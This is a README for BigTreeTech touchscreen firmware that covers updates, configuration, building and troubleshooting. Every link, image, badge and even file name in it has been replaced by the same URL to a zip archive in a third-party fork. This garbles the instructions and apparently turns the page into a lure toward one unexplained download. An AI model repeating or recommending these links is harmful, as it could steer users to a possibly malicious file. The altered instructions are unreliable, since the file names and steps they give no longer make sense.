<!-- omit in toc -->
# BigTreeTech Touchscreen Firmware
![GitHub](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip)
[![GitHub contributors](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip)](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip)
![GitHub Release Date](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip)
[![Build Status](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip%https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip)](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip)

Firmware for BigTreeTech's dual-mode touchscreen 3D printer controllers

<img width=500 src="https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip">

<!-- omit in toc -->
## Table of Contents
- [Menus and Themes](#menus-and-themes)
- [Update TFT Firmware](#update-tft-firmware)
- [Configuration](#configuration)
- [Customization](#customization)
  - [Bootscreen and Icons](#bootscreen-and-icons)
  - [Firmware](#firmware)
- [Troubleshooting](#troubleshooting)
- [Version History](#version-history)

## Menus and Themes

| Classic Menu &amp; Icon Theme |  Unified Menu &amp; Material Icon Theme |
:--------------------------:|:-------------------------:
![](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip) | ![](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip)
Use firmware, icons, and fonts from the [`Copy to SD Card root directory to update`](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip%20to%20SD%20Card%20root%20directory%20to%20update) folder | Use firmware, icons, and fonts from the [`Copy to SD Card root directory to update - Unified Menu Material theme`](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip%20to%20SD%20Card%20root%20directory%20to%20update%20-%20Unified%20Menu%20Material%20theme) folder

## Update TFT Firmware

TFT firmware updates are comprised of two parts:

1. The firmware binary (`BIGTREE_TFT*_V*.*.*.bin`). Example: `https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip`:
     - `BIGTREE_TFT_35`: model
     - `V3.0`: hardware version
     - `25.2`: software version
2. Fonts and Icons (`TFT*` folder):
   - `TFT*/font`: fonts
   - `TFT*/bmp`: icons

Copy both the `BIGTREE_TFT*_V*.*.*.bin` and `TFT*` folder to the root of a blank SD card that is <8GB and formatted as FAT32:

![image](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip)

Place SD card with `BIGTREE_TFT*_V*.*.*.bin` &amp; `TFT*` folder into the TFT's SD card reader and power cycle your printer to start the update process.

<p align=center> ⚠️ Failing to update your icons &amp; fonts will result in missing icons and/or unreadable text ⚠️ </p>

## Configuration
The Firmware can be configured using the **https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip** file from from one of these folders:
[`Copy to SD Card root directory to update`](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip%20to%20SD%20Card%20root%20directory%20to%20update) or
[`Copy to SD Card root directory to update - Unified Menu Material theme`](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip%20to%20SD%20Card%20root%20directory%20to%20update%20-%20Unified%20Menu%20Material%20theme)

### Editing configuration (https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip) file
To edit the **https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip** file follow the instruction here: [Detailed Instructions here](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip)

### Updating Firmware Configuration
To update the Firmware configuration:
1. Edit the settings in **https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip**.
2. Copy the **https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip** file to the root of the SD card. (The SD card capacity should be less than or equal to 8GB and formatted as FAT32)
3. Insert the SD card in the TFT's SD card slot and restart the TFT by pressing the reset buttion or disconnecting and connecting the power cable.
4. The TFT will update and store the configuraiton form **https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip** file.

## Customization

### Bootscreen and Icons
See [Customization guides](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip) for detailed  information.

### Firmware
<details><summary>View full instructions</summary>
<ol>
<li>Setup Visual Studio Code with PlatformIO <a href="https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip%20to%20install%20VScode+https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip">instructions</a></li>
<li>Click on the PlatformIO icon (①) and then click on Open Project (②):
   <img src="https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip"></li>
<li>Find the BIGTREETECH  firmware source directory , then click Open:
   <img src="https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip"></li>
  <li>After opening the project, edit <a href="https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip"><code>https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip</code></a> and change the <code>default_envs</code> to one that matches your TFT model and version:
   <pre>;BIGTREE_TFT35_V1_0
;BIGTREE_TFT35_V1_1
;BIGTREE_TFT35_V1_2
;BIGTREE_TFT35_V2_0
;BIGTREE_TFT35_V3_0
;BIGTREE_TFT35_E3_V3_0
;BIGTREE_TFT28_V1_0
;BIGTREE_TFT28_V3_0
;BIGTREE_TFT24_V1_1
;MKS_32_V1_4
;MKS_32_V1_4_NOBL

[platformio]
src_dir      = TFT
boards_dir   = buildroot/boards
default_envs = BIGTREE_TFT35_V3_0</pre></li>
  <li>Click the check mark (✓) at the bottom of VSCode or press <code>Ctrl</code>+<code>Alt</code>+<code>B</code> (Windows) / <code>Ctrl</code>+<code>Option</code>+<code>B</code> (macOS) to compile.

<img src="https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip"></li>
<li>A <code>BIGTREE_TFT*_V*.*.*.bin</code> file will be generated in the <em>hidden</em> <code>.pio\build\BIGTREE_TFT*_V*_*</code> folder. Follow the update process outlined in the <a href="#about-tft-firmware">About TFT Firmware</a> section above to update your TFT to the latest version.</li>
</details>

## Troubleshooting

To reset the TFT's touch screen calibration, create a blank file named `https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip` and place in root folder of the sd card. Insert the SD card into the TFT's SD card reader and power cycle your printer to start the reset process.

## Version History

See [BIGTREETECH-TouchScreenFirmware/releases](https://raw.githubusercontent.com/ajzbern/BIGTREETECH-TouchScreenFirmware/master/TFT35_V2 Bootloader fix/BIQU_TFT35_V2.0_bootloader.zip) for a complete version history.
